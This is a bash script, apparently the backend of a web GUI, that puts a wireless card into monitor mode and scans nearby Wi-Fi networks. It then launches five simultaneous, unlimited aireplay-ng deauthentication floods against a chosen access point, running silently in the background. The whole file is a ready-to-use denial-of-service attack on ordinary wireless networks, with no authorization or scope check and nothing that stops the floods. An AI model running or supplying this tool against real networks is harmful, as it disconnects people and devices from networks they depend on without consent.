#!/usr/bin/env bash
# wifiDeauth.sh
# Usage:
#   sudo ./wifiDeauth.sh [network_interface] [BSSID] [CH]
# If BSSID & CH are provided -> non-interactive (for Flask).
# If not -> falls back to an interactive TTY flow (still headless, logs only).

if [[ $EUID -ne 0 ]]; then
   echo -e "\033[1;91m\n[!] Wifi-Deauth must be run as root. Aborting.... \n\033[1;m"; exit 1;
fi

set -euo pipefail
IFS=$'\n\t'

network_interface="${1:-wlan1}"
maybe_bssid="${2:-}"
maybe_ch="${3:-}"

mon_suffix="mon"
mon_iface="${network_interface}${mon_suffix}"

LOGDIR="/tmp/wifigui-logs"
mkdir -p "$LOGDIR"
log(){ printf "%s %s\n" "$(date +'%F %T')" "$*" | tee -a "$LOGDIR/deauth.log" >/dev/null; }

lock_channel() {
  local ch="$1"
  # Set channel at creation time (when supported) or plain start
  airmon-ng start "$network_interface" "$ch" >/dev/null 2>&1 || airmon-ng start "$network_interface" >/dev/null 2>&1 || true
  # Force channel with iw/iwconfig (covers most drivers)
  iw dev "$mon_iface" set channel "$ch" 2>/dev/null || true
  iwconfig "$mon_iface" channel "$ch" 2>/dev/null || true
  sleep 1
  log "[*] Locked $mon_iface to CH $ch"
}

# ---------- Non-interactive path ----------
if [[ -n "$maybe_bssid" && -n "$maybe_ch" ]]; then
  BSSID="$maybe_bssid"; CH="$maybe_ch"
  log "[*] Non-interactive: IFACE=$network_interface BSSID=$BSSID CH=$CH"

  lock_channel "$CH"

  # short targeted airodump (3s) -> log only
  stdbuf -oL -eL airodump-ng -c "$CH" --bssid "$BSSID" "$mon_iface" \
    >> "$LOGDIR/airodump-target.log" 2>&1 & AiroPID=$!
  ( sleep 3; kill "$AiroPID" 2>/dev/null || true ) &

  # re-lock (some drivers drift)
  lock_channel "$CH"

  # deauth in background, all output to logs, no xterm
  for i in 1 2 3 4 5; do
    stdbuf -oL -eL aireplay-ng -0 0 -a "$BSSID" "$mon_iface" \
      >> "$LOGDIR/deauth.log" 2>&1 &
  done

  log "[~] Deauth started."
  exit 0
fi

# ---------- Interactive fallback (TTY) ----------
tmp_dir="$(mktemp -d)"
csv_prefix="$tmp_dir/airodump"
scan_duration=15

cleanup(){ pkill -f "airodump-ng .*${csv_prefix}" 2>/dev/null || true; rm -rf "$tmp_dir"; }
trap cleanup EXIT

log "[*] Interactive mode: scanning ${scan_duration}s on $network_interface"
airmon-ng start "$network_interface" >/dev/null 2>&1 || true
timeout $((scan_duration+15)) airodump-ng --write-interval 1 --write "$csv_prefix" --output-format csv "$mon_iface" >/dev/null 2>&1 &
sleep 5

# wait for CSV
csvfile=""; wait_seconds=0; max_wait=$((scan_duration+6))
while [[ -z "$csvfile" && $wait_seconds -lt $max_wait ]]; do
  sleep 1; wait_seconds=$((wait_seconds+1))
  f=$(ls -1t "$tmp_dir"/airodump-*.csv 2>/dev/null | head -n1 || true)
  [[ -n "$f" ]] && csvfile="$f"
done
[[ -z "$csvfile" ]] && { log "[!] No CSV found."; exit 1; }

awk -F',' '
  BEGIN{in_bss=1}
  NF==1 && $1==""{in_bss=0; next}
  in_bss && NR>1{
    for(i=1;i<=NF;i++){gsub(/^[ \t]+|[ \t]+$/,"",$i)}
    bssid=$1; ch=$4; essid=$14
    if(bssid!="" && essid!="") printf("%s,%s,%s\n",bssid,ch,essid)
  }
' "$csvfile" > "$tmp_dir/networks_parsed.csv"
[[ ! -s "$tmp_dir/networks_parsed.csv" ]] && { log "[!] No networks parsed."; exit 1; }

nl -w2 -s'. ' -ba "$tmp_dir/networks_parsed.csv" | awk -F',' '{printf("%2d) %-20s  CH:%-3s  ESSID: %s\n", NR, $1, $2, $3)}'
echo
read -rp "[!] Choose a network number: " sel
total=$(wc -l < "$tmp_dir/networks_parsed.csv")
(( sel>=1 && sel<=total )) || { log "[!] Out of range."; exit 1; }
chosen=$(sed -n "${sel}p" "$tmp_dir/networks_parsed.csv")
BSSID=$(awk -F',' '{gsub(/^[ \t]+|[ \t]+$/,"",$1); print $1}' <<<"$chosen")
CH=$(awk -F',' '{gsub(/^[ \t]+|[ \t]+$/,"",$2); print $2}' <<<"$chosen")
ESSID=$(awk -F',' '{gsub(/^[ \t]+|[ \t]+$/,"",$3); print $3}' <<<"$chosen")
log ">> Selected: $ESSID  BSSID:$BSSID  CH:$CH"

lock_channel "$CH"

stdbuf -oL -eL airodump-ng -c "$CH" --bssid "$BSSID" "$mon_iface" \
  >> "$LOGDIR/airodump-target.log" 2>&1 & AiroPID=$!
( sleep 3; kill "$AiroPID" 2>/dev/null || true ) &

lock_channel "$CH"
for i in 1 2 3 4 5; do
  stdbuf -oL -eL aireplay-ng -0 0 -a "$BSSID" "$mon_iface" \
    >> "$LOGDIR/deauth.log" 2>&1 &
done
log "[~] Deauth started."
